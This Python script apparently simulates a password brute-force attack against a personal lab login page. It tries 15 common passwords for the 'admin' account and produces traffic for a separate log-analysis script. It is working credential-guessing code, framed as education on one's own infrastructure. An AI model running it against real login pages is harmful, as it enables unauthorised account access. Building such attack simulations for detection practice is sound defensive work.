#!/usr/bin/env python3
"""
Simple Brute Force Attack Simulation
Attempts common passwords against a target username
"""

import requests
import time
from datetime import datetime

# Target configuration
TARGET_URL = "https://jasonklutts.com/lab/login"
TARGET_USERNAME = "admin"

# Common passwords to try
COMMON_PASSWORDS = [
    "password",
    "123456",
    "admin",
    "letmein",
    "welcome",
    "Password1",
    "admin123",
    "qwerty",
    "password123",
    "root",
    "administrator",
    "12345678",
    "passw0rd",
    "test",
    "guest"
]

def attempt_login(username, password):
    """
    Attempt a single login with given credentials
    """
    try:
        data = {
            'username': username,
            'password': password
        }
        
        response = requests.post(TARGET_URL, data=data, verify=True, timeout=10)
        
        return response.status_code
    
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

def run_brute_force():
    """
    Execute brute force attack against target
    """
    print("=" * 60)
    print("BRUTE FORCE ATTACK SIMULATION")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Username: {TARGET_USERNAME}")
    print(f"Passwords to try: {len(COMMON_PASSWORDS)}")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()
    
    successful = 0
    failed = 0
    
    for i, password in enumerate(COMMON_PASSWORDS, 1):
        print(f"[{i}/{len(COMMON_PASSWORDS)}] Trying: {TARGET_USERNAME}:{password}")
        
        status = attempt_login(TARGET_USERNAME, password)
        
        if status == 200:
            failed += 1
            print(f"    → Failed")
        elif status:
            print(f"    → Status: {status}")
        
        # Small delay between attempts (realistic attacker behavior)
        time.sleep(0.5)
    
    print()
    print("=" * 60)
    print("ATTACK COMPLETE")
    print("=" * 60)
    print(f"Total attempts: {len(COMMON_PASSWORDS)}")
    print(f"Failed logins: {failed}")
    print(f"Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    print("Check logs with: python3 analyze_logs.py")
    print("=" * 60)

if __name__ == '__main__':
    import sys
    
    # Check if running with --auto flag (for dashboard)
    if len(sys.argv) > 1 and sys.argv[1] == '--auto':
        run_brute_force()
    else:
        print("\n⚠️  WARNING: This is for educational purposes on YOUR OWN infrastructure only\n")
        
        response = input("Continue with attack simulation? (yes/no): ")
        
        if response.lower() == 'yes':
            run_brute_force()
        else:
            print("Attack cancelled.")
